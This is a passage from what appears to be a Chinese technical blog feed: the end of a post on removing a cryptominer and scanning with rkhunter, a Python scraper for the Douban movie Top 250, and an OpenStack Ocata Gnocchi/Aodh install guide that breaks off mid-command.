class="headerlink" title="6. 过程总结"></a>6. 过程总结</h3><p>找系统漏洞-&gt;获取权限-&gt;创建目录-&gt;上传文件-&gt;执行x，执行a-&gt;a启动crontab执行upd，生成upd并赋权-&gt;upd去执行run-&gt;run去执行真正的挖矿程序。</p><h2 id="清除挖矿程序"><a href="#清除挖矿程序" class="headerlink" title="清除挖矿程序"></a>清除挖矿程序</h2><h3 id="1-kill-掉可疑进程-删除程序目录"><a href="#1-kill-掉可疑进程-删除程序目录" class="headerlink" title="1. kill 掉可疑进程,删除程序目录"></a>1. kill 掉可疑进程,删除程序目录</h3><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># kill -<span class="number">9</span> <span class="number">19078</span> &amp;&amp; rm -rf <span class="regexp">/tmp/</span>.n &amp;&amp; rm -rf <span class="regexp">/tmp/</span>.a</span><br></pre></td></tr></table></figure><h3 id="2-修改-vmuser-用户密码"><a href="#2-修改-vmuser-用户密码" class="headerlink" title="2. 修改 vmuser 用户密码"></a>2. 修改 vmuser 用户密码</h3><p>注意到挖矿程序都是 vmuser 用户，所以修改 vmuser 用户密码</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># passwd vmuser</span></span><br></pre></td></tr></table></figure><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h2><p>不放心，使用 rkhunter 检测一下</p><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1. 下载安装"></a>1. 下载安装</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span></span><br><span class="line"><span class="meta"># tar zxvf rkhunter-1.4.4.tar.gz &amp;&amp; tar zxvf rkhunter-1.4.4.tar.gz &amp;&amp; cd rkhunter-1.4.4</span></span><br><span class="line"><span class="meta"># ./install.sh --install</span></span><br></pre></td></tr></table></figure><h3 id="2-入侵检测"><a href="#2-入侵检测" class="headerlink" title="2. 入侵检测"></a>2. 入侵检测</h3><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rkhunter -c -sk</span></span><br><span class="line"></span><br><span class="line">System checks summary</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">File properties checks...</span><br><span class="line">    Required commands<span class="built_in"> check </span>failed</span><br><span class="line">    Files checked: 136</span><br><span class="line">    Suspect files: 5</span><br><span class="line"></span><br><span class="line">Rootkit checks...</span><br><span class="line">    Rootkits checked<span class="keyword"> :</span> 481</span><br><span class="line">    Possible rootkits: 0</span><br><span class="line"></span><br><span class="line">Applications checks...</span><br><span class="line">    All checks skipped</span><br><span class="line"></span><br><span class="line">The<span class="keyword"> system</span> checks took: 7 minutes<span class="built_in"> and </span>22 seconds</span><br><span class="line"></span><br><span class="line">All results have been written to the log file: /var/log/rkhunter.log</span><br><span class="line"></span><br><span class="line">One<span class="built_in"> or </span>more warnings have been found while checking the<span class="keyword"> system</span>.</span><br><span class="line">Please<span class="built_in"> check </span>the log file (/var/log/rkhunter.log)</span><br></pre></td></tr></table></figure><p>Suspect files 的警告和正常服务器上的一致，这里忽略</p><h3 id="3-卸载-rkhunter"><a href="#3-卸载-rkhunter" class="headerlink" title="3. 卸载 rkhunter"></a>3. 卸载 rkhunter</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">cd</span> rkhunter-<span class="number">1.4</span>.<span class="number">4</span> &amp;&amp; ./install.<span class="keyword">sh</span> --<span class="built_in">remove</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> virus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取豆瓣电影TOP 250并存入文件</title>
      <link href="python/douban-file-top250.html"/>
      <url>python/douban-file-top250.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">DOWNLOAD_URL = <span class="string">&#x27;http://movie.douban.com/top250&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_page</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0&#x27;</span>&#125;</span><br><span class="line">    data = requests.get(url, headers=headers).content</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_html</span>(<span class="params">html</span>):</span></span><br><span class="line">    <span class="comment">#更换解析器，详情 https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#id9</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    movies_list_soup = soup.find(<span class="string">&#x27;ol&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;grid_view&#x27;</span>&#125;)</span><br><span class="line">    movie_name_list = []</span><br><span class="line">    movie_rating_num_list = []</span><br><span class="line">    movie_quote_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> movies_li <span class="keyword">in</span> movies_list_soup.find_all(<span class="string">&#x27;li&#x27;</span>):</span><br><span class="line">        movie_name = movies_li.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;hd&#x27;</span>&#125;).find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;title&#x27;</span>&#125;).getText()</span><br><span class="line">        movie_rating = movies_li.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;bd&#x27;</span>&#125;).find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;rating_num&#x27;</span>,</span><br><span class="line">                                                                                        <span class="string">&#x27;property&#x27;</span>: <span class="string">&#x27;v:average&#x27;</span>&#125;).getText()</span><br><span class="line">        <span class="comment">#movie_quote = movies_li.find(&#x27;div&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;bd&#x27;&#125;).find(&#x27;span&#x27;, attrs=&#123;&#x27;class&#x27;: &#x27;inq&#x27;&#125;).getText()</span></span><br><span class="line">        movie_quote_obj = movies_li.find(<span class="string">&#x27;div&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;bd&#x27;</span>&#125;).find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;inq&#x27;</span>&#125;)</span><br><span class="line">        <span class="comment">### 发现某部电影评价为空，此处判断评价是否为空</span></span><br><span class="line">        <span class="keyword">if</span> movie_quote_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            movie_quote = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            movie_quote = movie_quote_obj.getText()</span><br><span class="line"></span><br><span class="line">        movie_name_list.append(movie_name)</span><br><span class="line">        movie_rating_num_list.append(movie_rating)</span><br><span class="line">        movie_quote_list.append(movie_quote)</span><br><span class="line"></span><br><span class="line">    next_page = soup.find(<span class="string">&#x27;span&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;next&#x27;</span>&#125;).find(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> next_page:</span><br><span class="line">        <span class="keyword">return</span> movie_name_list, movie_rating_num_list, movie_quote_list, DOWNLOAD_URL + next_page[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> movie_name_list, movie_rating_num_list, movie_quote_list, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = DOWNLOAD_URL</span><br><span class="line">    <span class="comment">#utf_8_sig 解决windows下csv文件乱码问题</span></span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;movies_top_250.csv&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>, encoding=<span class="string">&#x27;utf_8_sig&#x27;</span>) <span class="keyword">as</span> csvFile:</span><br><span class="line">        writer = csv.writer(csvFile)</span><br><span class="line">        writer.writerow((<span class="string">u&#x27;电影名&#x27;</span>, <span class="string">u&#x27;评分&#x27;</span>, <span class="string">u&#x27;理由&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> url:</span><br><span class="line">            html = download_page(url)</span><br><span class="line">            movies, rating, quote, url = parse_html(html)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(movies)):</span><br><span class="line">                writer.writerow((movies[i], rating[i], quote[i]))</span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> douban </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack ocata部署ceilometer+gnocchi</title>
      <link href="openstack/ceilometer-gnocchi.html"/>
      <url>openstack/ceilometer-gnocchi.html</url>
      
        <content type="html"><![CDATA[<h1 id="安装Gnocchi"><a href="#安装Gnocchi" class="headerlink" title="安装Gnocchi"></a>安装Gnocchi</h1><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><h3 id="1-完成以下步骤，创建数据库"><a href="#1-完成以下步骤，创建数据库" class="headerlink" title="1. 完成以下步骤，创建数据库"></a>1. 完成以下步骤，创建数据库</h3><ul><li>使用 root 用户登录数据库<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>mysql -u root -p</span><br></pre></td></tr></table></figure></li><li>创建 gnocchi 数据库<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> gnocchi;</span><br></pre></td></tr></table></figure></li><li>配置 gnocchi 数据库权限（这里密码为 GNOCCHI_DBPASS，按需修改）<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> gnocchi.* <span class="keyword">TO</span> <span class="string">&#x27;gnocchi&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;GNOCCHI_DBPASS&#x27;</span>;</span><br><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> gnocchi.* <span class="keyword">TO</span> <span class="string">&#x27;gnocchi&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;GNOCCHI_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>退出数据库</li></ul><h3 id="2-加载-admin-用户认证文件"><a href="#2-加载-admin-用户认证文件" class="headerlink" title="2. 加载 admin 用户认证文件"></a>2. 加载 admin 用户认证文件</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>. admin-openrc</span><br></pre></td></tr></table></figure><h3 id="3-完成以下步骤创建服务认证"><a href="#3-完成以下步骤创建服务认证" class="headerlink" title="3. 完成以下步骤创建服务认证"></a>3. 完成以下步骤创建服务认证</h3><ul><li>创建 gnocchi 用户（用户密码为 GNOCCHI_PASS）<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">user</span> <span class="title">create</span> --domain default --password-prompt gnocchi</span><br></pre></td></tr></table></figure></li><li>为 gnocchi 用户增加 admin 的角色<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">role</span> <span class="title">add</span> --project service --<span class="keyword">user</span> <span class="title">gnocchi</span> admin</span><br></pre></td></tr></table></figure></li><li>创建 gnocchi 服务实体<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line">$ <span class="string">openstack</span> <span class="string">service</span> <span class="string">create</span> <span class="built_in">--name</span> <span class="string">gnocchi</span> <span class="built_in">--description</span> <span class="string">&quot;Metric Service&quot;</span> <span class="string">metric</span> </span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li>创建 gnocchi 服务API endpoints<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metric <span class="keyword">public</span> http:<span class="comment">//controller:8041</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metric internal http:<span class="comment">//controller:8041</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne metric admin http:<span class="comment">//controller:8041</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="安装和配置组件"><a href="#安装和配置组件" class="headerlink" title="安装和配置组件"></a>安装和配置组件</h3></li></ol><h3 id="1-安装软件包"><a href="#1-安装软件包" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># yum install openstack-gnocchi-api openstack-gnocchi-metricd python2-gnocchiclient -y</span></span><br></pre></td></tr></table></figure><h3 id="2-编辑-etc-gnocchi-gnocchi-conf-文件加入以下内容"><a href="#2-编辑-etc-gnocchi-gnocchi-conf-文件加入以下内容" class="headerlink" title="2. 编辑 /etc/gnocchi/gnocchi.conf 文件加入以下内容"></a>2. 编辑 /etc/gnocchi/gnocchi.conf 文件加入以下内容</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /etc/gnocchi/gnocchi.conf</span></span><br><span class="line"></span><br><span class="line">[DEFAULT]</span><br><span class="line">log_dir = /var/<span class="built_in">log</span>/gnocchi</span><br><span class="line"></span><br><span class="line">[api]</span><br><span class="line">auth_mode = keystone</span><br><span class="line"></span><br><span class="line">[indexer]</span><br><span class="line">url = mysql+pymysql://gnocchi:GNOCCHI_DBPASS@controller/gnocchi</span><br><span class="line"></span><br><span class="line">[storage]</span><br><span class="line">driver = file</span><br><span class="line">file_basepath = /var/lib/gnocchi</span><br><span class="line"></span><br><span class="line">[keystone_authtoken]</span><br><span class="line">auth_uri = http://controller:5000</span><br><span class="line">auth_url = http://controller:35357</span><br><span class="line">memcached_servers = controller:11211</span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = default</span><br><span class="line">user_domain_name = default</span><br><span class="line">project_name = service</span><br><span class="line">username = gnocchi</span><br><span class="line">password = GNOCCHI_PASS</span><br></pre></td></tr></table></figure><h3 id="3-新建-10-gnocchi-wsgi-conf-文件，加入以下内容"><a href="#3-新建-10-gnocchi-wsgi-conf-文件，加入以下内容" class="headerlink" title="3. 新建 10-gnocchi_wsgi.conf 文件，加入以下内容"></a>3. 新建 10-gnocchi_wsgi.conf 文件，加入以下内容</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/httpd/conf.d/10-gnocchi_wsgi.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">8041</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:8041</span>&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">ServerName</span></span> controller</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Vhost docroot</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">&quot;/var/www/cgi-bin/gnocchi&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Directories, there should at least be a declaration for /var/www/cgi-bin/gnocchi</span></span><br><span class="line"></span><br><span class="line">  <span class="section">&lt;Directory <span class="string">&quot;/var/www/cgi-bin/gnocchi&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks MultiViews</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">  <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Logging</span></span><br><span class="line">  <span class="attribute">ErrorLog</span> <span class="string">&quot;/var/log/httpd/gnocchi_wsgi_error.log&quot;</span></span><br><span class="line">  <span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br><span class="line">  <span class="attribute">CustomLog</span> <span class="string">&quot;/var/log/httpd/gnocchi_wsgi_access.log&quot;</span> combined</span><br><span class="line">  <span class="attribute">SetEnvIf</span> X-Forwarded-Proto https HTTPS=<span class="number">1</span></span><br><span class="line">  <span class="attribute">WSGIApplicationGroup</span> <span class="variable">%&#123;GLOBAL&#125;</span></span><br><span class="line">  <span class="attribute">WSGIDaemonProcess</span> gnocchi display-name=gnocchi_wsgi group=gnocchi processes=<span class="number">8</span> threads=<span class="number">8</span> user=gnocchi</span><br><span class="line">  <span class="attribute">WSGIProcessGroup</span> gnocchi</span><br><span class="line">  <span class="attribute">WSGIScriptAlias</span> / <span class="string">&quot;/var/www/cgi-bin/gnocchi/app&quot;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-复制-app-wsgi"><a href="#4-复制-app-wsgi" class="headerlink" title="4. 复制 app.wsgi"></a>4. 复制 app.wsgi</h3>  <figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/g</span>nocchi/</span><br><span class="line"># cp <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/gnocchi/</span>rest<span class="regexp">/app.wsgi /</span>var<span class="regexp">/www/</span>cgi-bin<span class="regexp">/gnocchi/</span>app</span><br><span class="line"># chown -R gnocchi.gnocchi <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/g</span>nocchi</span><br></pre></td></tr></table></figure><h3 id="5-完成安装"><a href="#5-完成安装" class="headerlink" title="5. 完成安装"></a>5. 完成安装</h3><h4 id="1-初始化数据库"><a href="#1-初始化数据库" class="headerlink" title="1. 初始化数据库"></a>1. 初始化数据库</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># su -s <span class="regexp">/bin/</span>bash gnocchi -c <span class="string">&quot;gnocchi-upgrade&quot;</span> </span><br></pre></td></tr></table></figure><h4 id="2-重启-httpd-以加载-gnocchi"><a href="#2-重启-httpd-以加载-gnocchi" class="headerlink" title="2. 重启 httpd 以加载 gnocchi"></a>2. 重启 httpd 以加载 gnocchi</h4><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl restart httpd</span></span><br></pre></td></tr></table></figure><h5 id="3-启动服务并设置开机自启"><a href="#3-启动服务并设置开机自启" class="headerlink" title="3. 启动服务并设置开机自启"></a>3. 启动服务并设置开机自启</h5><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl enable openstack-gnocchi-metricd </span></span><br><span class="line"><span class="meta"># systemctl start openstack-gnocchi-metricd </span></span><br></pre></td></tr></table></figure><h1 id="Telemetry-服务"><a href="#Telemetry-服务" class="headerlink" title="Telemetry 服务"></a>Telemetry 服务</h1><h2 id="Aodh-服务-ceilometer节点"><a href="#Aodh-服务-ceilometer节点" class="headerlink" title="Aodh 服务 (ceilometer节点)"></a>Aodh 服务 (ceilometer节点)</h2><h3 id="先决条件-1"><a href="#先决条件-1" class="headerlink" title="先决条件"></a>先决条件</h3><h4 id="1-完成以下步骤，创建数据库-1"><a href="#1-完成以下步骤，创建数据库-1" class="headerlink" title="1. 完成以下步骤，创建数据库"></a>1. 完成以下步骤，创建数据库</h4><ul><li>使用 root 用户登录数据库<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>mysql -u root -p</span><br></pre></td></tr></table></figure></li><li>创建 aodh 数据库<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> aodh;</span><br></pre></td></tr></table></figure></li><li>配置 aodh 数据库权限（这里密码为 AODH_DBPASSWORD，按需修改）<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> aodh.* <span class="keyword">TO</span> <span class="string">&#x27;aodh&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;AODH_DBPASSWORD&#x27;</span>;</span><br><span class="line">&gt; <span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> aodh.* <span class="keyword">TO</span> <span class="string">&#x27;aodh&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;AODH_DBPASSWORD&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li>退出数据库</li></ul><h4 id="2-加载-admin-用户认证文件-1"><a href="#2-加载-admin-用户认证文件-1" class="headerlink" title="2. 加载 admin 用户认证文件"></a>2. 加载 admin 用户认证文件</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>. admin-openrc</span><br></pre></td></tr></table></figure><h4 id="3-完成一下步骤创建服务认证"><a href="#3-完成一下步骤创建服务认证" class="headerlink" title="3. 完成一下步骤创建服务认证"></a>3. 完成一下步骤创建服务认证</h4><ul><li>创建 aodh 用户（用户密码为 AODH_PASSWORD）<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">user</span> <span class="title">create</span> --domain default --password-prompt aodh</span><br></pre></td></tr></table></figure></li><li>为 aodh 用户增加 admin 的角色<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">$ openstack <span class="keyword">role</span> <span class="title">add</span> --project service --<span class="keyword">user</span> <span class="title">aodh</span> admin</span><br></pre></td></tr></table></figure></li><li>创建 aodh 服务实体<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line">$ <span class="string">openstack</span> <span class="string">service</span> <span class="string">create</span> <span class="built_in">--name</span> <span class="string">aodh</span> <span class="built_in">--description</span> <span class="string">&quot;Telemetry&quot;</span> <span class="string">alarming</span></span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li>创建告警服务API endpoints<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne alarming <span class="keyword">public</span> http:<span class="comment">//controller:8042</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne alarming internal http:<span class="comment">//controller:8042</span></span><br><span class="line">$ openstack endpoint <span class="keyword">create</span> --region RegionOne alarming admin http:<span class="comment">//controller:8042</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="安装和配置组件-1"><a href="#安装和配置组件-1" class="headerlink" title="安装和配置组件"></a>安装和配置组件</h3><h4 id="1-安装软件包-1"><a href="#1-安装软件包-1" class="headerlink" title="1. 安装软件包"></a>1. 安装软件包</h4><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install openstack-aodh-api \</span></span><br><span class="line">  openstack-aodh-evaluator openstack-aodh-notifier <span class="string">\</span></span><br><span class="line">  openstack-aodh-listener openstack-aodh-expirer <span class="string">\</span></span><br><span class="line">  python-aodhclient -y</span><br></pre></td></tr></table></figure><h4 id="2-编辑-etc-aodh-aodh-conf-文件加入以下内容"><a href="#2-编辑-etc-aodh-aodh-conf-文件加入以下内容" class="headerlink" title="2. 编辑 /etc/aodh/aodh.conf 文件加入以下内容"></a>2. 编辑 /etc/aodh/aodh.conf 文件加入以下内容</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/aodh/aodh.conf</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="attr">transport_url</span> = rabbit://openstack:root1234@controller</span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://aodh:AODH_DBPASSWORD@controller/aodh</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_uri</span> = http://controller:<span class="number">5000</span></span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">35357</span></span><br><span class="line"><span class="attr">memcached_servers</span> = controller:<span class="number">11211</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = aodh</span><br><span class="line"><span class="attr">password</span> = AODH_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="section">[service_credentials]</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">auth_url</span> = http://controller:<span class="number">5000</span>/v3</span><br><span class="line"><span class="attr">project_domain_name</span> = default</span><br><span class="line"><span class="attr">user_domain_name</span> = default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = aodh</span><br><span class="line"><span class="attr">password</span> = AODH_PASSWORD</span><br><span class="line"><span class="attr">interface</span> = internalURL</span><br><span class="line"><span class="attr">region_name</span> = RegionOne</span><br></pre></td></tr></table></figure><h4 id="3-新建-etc-httpd-conf-d-10-aodh-wsgi-conf-文件，加入以下内容"><a href="#3-新建-etc-httpd-conf-d-10-aodh-wsgi-conf-文件，加入以下内容" class="headerlink" title="3. 新建 /etc/httpd/conf.d/10-aodh_wsgi.conf 文件，加入以下内容"></a>3. 新建 /etc/httpd/conf.d/10-aodh_wsgi.conf 文件，加入以下内容</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/httpd/conf.d/10-aodh_wsgi.conf</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">Listen</span></span> <span class="number">8042</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:8042</span>&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">ServerName</span></span> controller</span><br><span class="line"></span><br><span class="line">  <span class="comment">## Vhost docroot</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">DocumentRoot</span></span> <span class="string">&quot;/var/www/cgi-bin/aodh&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Directories, there should at least be a declaration for /var/www/cgi-bin/aodh</span></span><br><span class="line"></span><br><span class="line">  <span class="section">&lt;Directory <span class="string">&quot;/var/www/cgi-bin/aodh&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Options</span></span> Indexes FollowSymLinks MultiViews</span><br><span class="line">    <span class="attribute">AllowOverride</span> None</span><br><span class="line">    <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">  <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## Logging</span></span><br><span class="line">  <span class="attribute">ErrorLog</span> <span class="string">&quot;/var/log/httpd/aodh_wsgi_error.log&quot;</span></span><br><span class="line">  <span class="attribute">ServerSignature</span> <span class="literal">Off</span> </span><br><span class="line">  <span class="attribute">CustomLog</span> <span class="string">&quot;/var/log/httpd/aodh_wsgi_access.log&quot;</span> combined </span><br><span class="line">  <span class="attribute">SetEnvIf</span> X-Forwarded-Proto https HTTPS=<span class="number">1</span></span><br><span class="line">  <span class="attribute">WSGIApplicationGroup</span> <span class="variable">%&#123;GLOBAL&#125;</span></span><br><span class="line">  <span class="attribute">WSGIDaemonProcess</span> aodh display-name=aodh_wsgi group=aodh processes=<span class="number">2</span> threads=<span class="number">2</span> user=aodh</span><br><span class="line">  <span class="attribute">WSGIProcessGroup</span> aodh</span><br><span class="line">  <span class="attribute">WSGIScriptAlias</span> / <span class="string">&quot;/var/www/cgi-bin/aodh/app&quot;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-复制-app-wsgi-1"><a href="#4-复制-app-wsgi-1" class="headerlink" title="4. 复制 app.wsgi"></a>4. 复制 app.wsgi</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># mkdir <span class="regexp">/var/</span>www<span class="regexp">/cgi-bin/</span>aodh/</span><br><span class="line"># cp <span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/aodh/</span>api<span class="regexp">/app.wsgi /</span>var<span class="regexp">/www/</span>cgi-bin<span class="regexp">/aodh/</span>app</span><br><span class="line"># chown -R 